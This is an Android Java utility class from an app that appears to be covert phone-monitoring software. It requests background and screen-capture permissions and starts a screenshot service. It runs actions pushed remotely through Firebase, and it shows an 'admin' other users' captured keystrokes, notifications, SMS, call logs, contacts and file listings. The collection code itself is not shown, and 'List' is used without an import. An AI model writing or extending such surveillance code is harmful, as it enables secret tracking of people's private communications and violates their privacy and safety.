package com.vikasyadavnsit.cdc.utils;

import static android.app.Activity.RESULT_OK;
import static android.content.Context.ALARM_SERVICE;
import static com.vikasyadavnsit.cdc.constants.AppConstants.MEDIA_PROJECTION_REQUEST_CODE;
import static com.vikasyadavnsit.cdc.services.AppUsageStats.hasUsageStatsPermission;
import static com.vikasyadavnsit.cdc.utils.CommonUtil.hasFileAccess;
import static com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.getMessageText;
import static com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.getShayariData;

import android.app.Activity;
import android.app.AlarmManager;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.LocationManager;
import android.media.projection.MediaProjectionManager;
import android.net.ConnectivityManager;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.vikasyadavnsit.cdc.constants.AppConstants;
import com.vikasyadavnsit.cdc.data.AppUsageReportData;
import com.vikasyadavnsit.cdc.data.KeyStrokeData;
import com.vikasyadavnsit.cdc.data.NotificationData;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
import com.vikasyadavnsit.cdc.fragment.AccessibilityNotificationFragment;
import com.vikasyadavnsit.cdc.fragment.AdminCallLogsFragment;
import com.vikasyadavnsit.cdc.fragment.AdminContactsFragment;
import com.vikasyadavnsit.cdc.fragment.AdminFileStructureFragment;
import com.vikasyadavnsit.cdc.fragment.AdminSensorsFragment;
import com.vikasyadavnsit.cdc.fragment.AdminSmsFragment;
import com.vikasyadavnsit.cdc.fragment.RemoteTriggerClickActionsFragment;
import com.vikasyadavnsit.cdc.fragment.KeyStrokesFragment;
import com.vikasyadavnsit.cdc.fragment.MessageFragment;
import com.vikasyadavnsit.cdc.fragment.SettingsFragment;
import com.vikasyadavnsit.cdc.fragment.SystemAppUsageStatisticsFragment;
import com.vikasyadavnsit.cdc.receiver.StatisticsBroadcastReceiver;
import com.vikasyadavnsit.cdc.services.ScreenshotService;

import java.lang.reflect.Type;
import java.util.Comparator;
import java.util.Map;
import java.util.Objects;
import java.util.TreeMap;

public class ActionUtils {

    private static Activity context;

    public static void setContext(Activity activity) {
        context = activity;
    }

    public static void onActivityResult(Activity activity, int requestCode, int resultCode, Intent data) {
        LoggerUtils.d("CommonUtil", "onActivityResult : requestCode : " + requestCode + " resultCode : " + resultCode);
        createMediaProjectionScreenshotServiceIntent(activity, requestCode, resultCode, data);
    }




    /**
     * Prompts the user to disable battery optimizations for the app if currently enforced.
     *
     * <p>This opens {@link Settings#ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS} when the app is not
     * exempt, which can improve the reliability of background services.</p>
     *
     * @param activity Activity used to access {@link PowerManager} and start the settings intent.
     */
    public static void checkAndRequestBatteryOptimization(Activity activity) {
        new com.vikasyadavnsit.cdc.permissions.PermissionManager().requestPermission(activity, com.vikasyadavnsit.cdc.enums.PermissionType.BATTERY_OPTIMIZATION);
    }

    /**
     * Registers a {@link BroadcastReceiver} to listen for various device/system events.
     *
     * <p>This builds an {@link IntentFilter} including screen on/off, boot, airplane mode, power
     * connected/disconnected, package changes, connectivity changes, bluetooth state changes, and
     * some time/date events. The receiver used is {@link StatisticsBroadcastReceiver}.</p>
     *
     * @param activity Activity used to call {@link Activity#registerReceiver(BroadcastReceiver, IntentFilter)}.
     */
    public static void registerPhoneStatistics(Activity activity) {
        // Create an intent filter
        IntentFilter filter = new IntentFilter();

        // System broadcast actions
        filter.addAction(Intent.ACTION_SCREEN_OFF); // Device screen turned off
        filter.addAction(Intent.ACTION_SCREEN_ON);  // Device screen turned on
        filter.addAction(Intent.ACTION_USER_PRESENT); // User unlocked the device (screen on)
        filter.addAction(Intent.ACTION_SHUTDOWN); // Device is shutting down
        filter.addAction(Intent.ACTION_REBOOT); // Device is rebooting (requires `REBOOT` permission)
        filter.addAction(Intent.ACTION_BOOT_COMPLETED); // Device boot completed (requires `RECEIVE_BOOT_COMPLETED` permission)
        filter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED); // Airplane mode toggled
        filter.addAction(Intent.ACTION_POWER_CONNECTED); // Power source connected (charger plugged in)
        filter.addAction(Intent.ACTION_POWER_DISCONNECTED); // Power source disconnected (charger unplugged)
        filter.addAction(Intent.ACTION_BATTERY_LOW); // Battery level is low
        filter.addAction(Intent.ACTION_HEADSET_PLUG); // Headset plug/unplug event
        filter.addAction(Intent.ACTION_PACKAGE_ADDED); // A package was added
        filter.addAction(Intent.ACTION_PACKAGE_REMOVED); // A package was removed
        filter.addAction(Intent.ACTION_PACKAGE_REPLACED); // A package was replaced
        filter.addAction(Intent.ACTION_PACKAGE_CHANGED); // A package was changed (e.g., app data update)

        // Network state broadcasts
        filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION); // Connectivity change (e.g., network connected/disconnected)

        // Bluetooth broadcasts
        filter.addAction(BluetoothAdapter.ACTION_STATE_CHANGED); // Bluetooth state changed
        filter.addAction(BluetoothDevice.ACTION_ACL_CONNECTED); // Bluetooth device connected
        filter.addAction(BluetoothDevice.ACTION_ACL_DISCONNECTED); // Bluetooth device disconnected

        // Location updates (requires location permissions)
        filter.addAction(LocationManager.PROVIDERS_CHANGED_ACTION); // Location providers changed

        // Other useful actions
        filter.addAction(Intent.ACTION_DATE_CHANGED); // Device date changed
        filter.addAction(Intent.ACTION_TIME_CHANGED); // Device time changed
        filter.addAction(Intent.ACTION_TIMEZONE_CHANGED); // Device timezone changed

        activity.registerReceiver(new StatisticsBroadcastReceiver(), filter);
    }

    /**
     * Opens the system "Usage access" settings if the app does not currently have usage stats access.
     *
     * @param activity Activity used to start {@link Settings#ACTION_USAGE_ACCESS_SETTINGS}.
     */
    public static void enableAppUsageStats(Activity activity) {
        new com.vikasyadavnsit.cdc.permissions.PermissionManager().requestPermission(activity, com.vikasyadavnsit.cdc.enums.PermissionType.PACKAGE_USAGE_STATS);
    }

    /**
     * Requests exact alarm permission on Android 12+ by opening the corresponding system settings.
     *
     * <p>Uses the static {@link #context} set by {@link #setContext(Activity)}.</p>
     */
    public static void requestExactAlarmPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }
    }

    /**
     * Checks whether the app can schedule exact alarms.
     *
     * @return {@code true} if exact alarms are allowed (or running on an Android version where they
     * are always allowed); {@code false} otherwise.
     */
    public static boolean canScheduleExactAlarms() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(ALARM_SERVICE);
            return alarmManager.canScheduleExactAlarms();
        }
        return true; // For older versions, exact alarms are always allowed
    }

    /**
     * Starts the MediaProjection consent flow for screen capture.
     *
     * <p>This launches the system screen-capture permission dialog. The result must be handled in
     * {@link #onActivityResult(Activity, int, int, Intent)} to start {@link ScreenshotService}.</p>
     *
     * @param activity Activity used to start the consent intent.
     */
    public static void startMediaProjectionService(Activity activity) {
        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        activity.startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), MEDIA_PROJECTION_REQUEST_CODE);
    }

    /**
     * Starts {@link ScreenshotService} when MediaProjection permission is granted.
     *
     * <p>This is invoked from {@link #onActivityResult(Activity, int, int, Intent)} and checks the
     * request/result codes. When consent is granted, it passes the result code and intent data to
     * the service as extras.</p>
     *
     * @param activity    Activity used to start the service.
     * @param requestCode Request code from {@code onActivityResult}.
     * @param resultCode  Result code from {@code onActivityResult}.
     * @param data        Result data intent from {@code onActivityResult}.
     */
    private static void createMediaProjectionScreenshotServiceIntent(Activity activity, int requestCode, int resultCode, Intent data) {
        if (requestCode == MEDIA_PROJECTION_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                Intent serviceIntent = new Intent(activity, ScreenshotService.class);
                serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_CODE, resultCode);
                serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_DATA, data);
                activity.startService(serviceIntent);
            }
        }
    }



    /**
     * Processes the RTDB app trigger settings map pushed from Firebase and executes enabled actions.
     *
     * <p>Logic summary:</p>
     * <ul>
     *   <li>Deserializes the incoming object into {@code Map<String, User.AppTriggerSettingsData>}.</li>
     *   <li>If file access exists, mirrors the settings into local Room via {@link ApplicationDataRepository}.</li>
     *   <li>For each enabled trigger, invokes the corresponding {@link com.vikasyadavnsit.cdc.enums.ClickActions} handler.</li>
     * </ul>
     *
     * @param obj Raw Firebase payload (typically a map-like structure).
     */
    public static void performFirebaseAction(Object obj) {
        Type type = new TypeToken<Map<String, User.AppTriggerSettingsData>>() {
        }.getType();
        Map<String, User.AppTriggerSettingsData> appTriggerSettingsDataMap = new Gson().fromJson(new Gson().toJson(obj), type);

        LoggerUtils.d("ActionUtils", "Remote data changed, reconfiguring app trigger settings");

        if (hasFileAccess()) {
            ApplicationDataRepository.updateAllRecords(appTriggerSettingsDataMap);
        }

        LoggerUtils.d("ActionUtils", "Processing Remote Firebase Actions");
        appTriggerSettingsDataMap.forEach((key, value) -> {
            if (value.isEnabled()) {
                LoggerUtils.d("ActionUtils", "Performing Remote Firebase Action for : " + key);
                value.getClickActions().getBiConsumer().accept(context, value);
            }
        });
    }

    /**
     * Applies a personalized message update (from Firebase or cached default) to the UI and prefs.
     *
     * @param obj Raw Firebase value for the message; may be {@code null}.
     */
    public static void performMessageAction(Object obj) {
        LoggerUtils.d("ActionUtils", "Performing Message Action");
        String message = Objects.isNull(obj) ? getMessageText(context) : obj.toString();
        SharedPreferenceUtils.updateMessageText(context, message);
        MessageFragment.updateMessage(message);
    }

    /**
     * Parses the flat user details from Firebase payload.
     */
    public static Map<String, User> parseFlatUserDetails(Object obj) {
        Type type = new TypeToken<Map<String, User>>() {}.getType();
        return new Gson().fromJson(new Gson().toJson(obj), type);
    }

    /**
     * Populates the Settings "admin" user dropdown with user details.
     */
    public static void performFlatUserDetailsActions(Map<String, User> userMap) {
        LoggerUtils.d("ActionUtils", "populating all users in admin setting dropdown");
        SettingsFragment.populateUserDropdown(context, userMap);
    }

    /**
     * Populates the Settings "admin" user dropdown with user details fetched from Firebase.
     *
     * @param obj Raw Firebase payload containing a map of users.
     */
    @Deprecated
    public static void performFlatUserDetailsActions(Object obj) {
        Map<String, User> userMap = parseFlatUserDetails(obj);
        performFlatUserDetailsActions(userMap);
    }

    /**
     * Displays a selected user's click-action trigger settings in the UI.
     *
     * @param obj Raw Firebase payload containing the user's trigger settings map.
     */
    public static void getAndUpdateAndroidUserClickActions(Object obj) {
        LoggerUtils.d("ActionUtils", "showing a user click actions permissions");
        Type type = new TypeToken<Map<String, User.AppTriggerSettingsData>>() {
        }.getType();
        Map<String, User.AppTriggerSettingsData> appTriggerSettingsDataMap = new Gson().fromJson(new Gson().toJson(obj), type);
        RemoteTriggerClickActionsFragment.addDynamicButtons(context, appTriggerSettingsDataMap);
    }

    /**
     * Displays a selected user's keystrokes feed in the UI, sorted by timestamp (descending).
     *
     * @param obj Raw Firebase payload containing keystroke records.
     */
    public static void displayAndroidUserKeystrokes(Object obj) {
        LoggerUtils.d("ActionUtils", "dispaying android user keystrokes");
        Type type = new TypeToken<TreeMap<String, KeyStrokeData>>() {
        }.getType();
        Map<String, KeyStrokeData> keyStrokeDataMap = new Gson().fromJson(new Gson().toJson(obj), type);
        // Create a TreeMap sorted by the timestamp field in KeyStrokeData
        TreeMap<String, KeyStrokeData> sortedMap = new TreeMap<>(Comparator.comparing(key -> keyStrokeDataMap.get(key).getTimestamp()).reversed());
        // Put all elements from the original map into the sorted TreeMap
        sortedMap.putAll(keyStrokeDataMap);
        KeyStrokesFragment.displayKeyStrokes(context, sortedMap);
    }

    /**
     * Displays a selected user's captured notifications in the UI, sorted by timestamp (descending).
     *
     * @param obj Raw Firebase payload containing notification records.
     */
    public static void displayAndroidUserAccessibilityNotification(Object obj) {
        LoggerUtils.d("ActionUtils", "displaying android user accessibility notification");
        Type type = new TypeToken<TreeMap<String, NotificationData>>() {
        }.getType();
        Map<String, NotificationData> notificationDataMap = new Gson().fromJson(new Gson().toJson(obj), type);
        // Create a TreeMap sorted by the timestamp field in KeyStrokeData
        TreeMap<String, NotificationData> notificationDataTreeMap = new TreeMap<>(Comparator.comparing(key -> notificationDataMap.get(key).getTimestamp()).reversed());
        // Put all elements from the original map into the sorted TreeMap
        notificationDataTreeMap.putAll(notificationDataMap);
        AccessibilityNotificationFragment.displayNotifications(context, notificationDataTreeMap);
    }

    /**
     * Displays a selected user's system app usage statistics report data in the UI.
     *
     * @param obj Raw Firebase payload containing app usage report data grouped by date.
     */
    public static void displaySystemAppUsageStatisticsReportData(Object obj) {
        LoggerUtils.d("ActionUtils", "displaying android user system app usage statistics");
        Type type = new TypeToken<TreeMap<String, TreeMap<String, AppUsageReportData>>>() {
        }.getType();
        TreeMap<String, TreeMap<String, AppUsageReportData>> appUsageStatisticsReportDataMap = new Gson().fromJson(new Gson().toJson(obj), type);
        SystemAppUsageStatisticsFragment.displaySystemAppUsageStatistics(context, appUsageStatisticsReportDataMap);
    }

    public static void displayRemoteSms(Object obj) {
        Type type = new TypeToken<Map<String, Map<String, String>>>() {}.getType();
        Map<String, Map<String, String>> data = new Gson().fromJson(new Gson().toJson(obj), type);
        AdminSmsFragment.displaySms(context, data);
    }

    public static void displayRemoteCallLogs(Object obj) {
        Type type = new TypeToken<Map<String, Map<String, String>>>() {}.getType();
        Map<String, Map<String, String>> data = new Gson().fromJson(new Gson().toJson(obj), type);
        AdminCallLogsFragment.displayCallLogs(context, data);
    }

    public static void displayRemoteContacts(Object obj) {
        Type type = new TypeToken<Map<String, Map<String, String>>>() {}.getType();
        Map<String, Map<String, String>> data = new Gson().fromJson(new Gson().toJson(obj), type);
        AdminContactsFragment.displayContacts(context, data);
    }

    public static void displayRemoteSensors(Object obj) {
        Type type = new TypeToken<Map<String, Object>>() {}.getType();
        Map<String, Object> data = new Gson().fromJson(new Gson().toJson(obj), type);
        AdminSensorsFragment.displaySensors(context, data);
    }

    public static void displayRemoteFileStructure(Object obj) {
        Type type = new TypeToken<List<Map<String, Object>>>() {}.getType();
        List<Map<String, Object>> data = new Gson().fromJson(new Gson().toJson(obj), type);
        AdminFileStructureFragment.displayFileStructure(context, data);
    }

    public static void getDirectoryStructure(Activity activity) {
        com.vikasyadavnsit.cdc.utils.FileExplorer.captureDirectoryStructure(activity);
    }
}
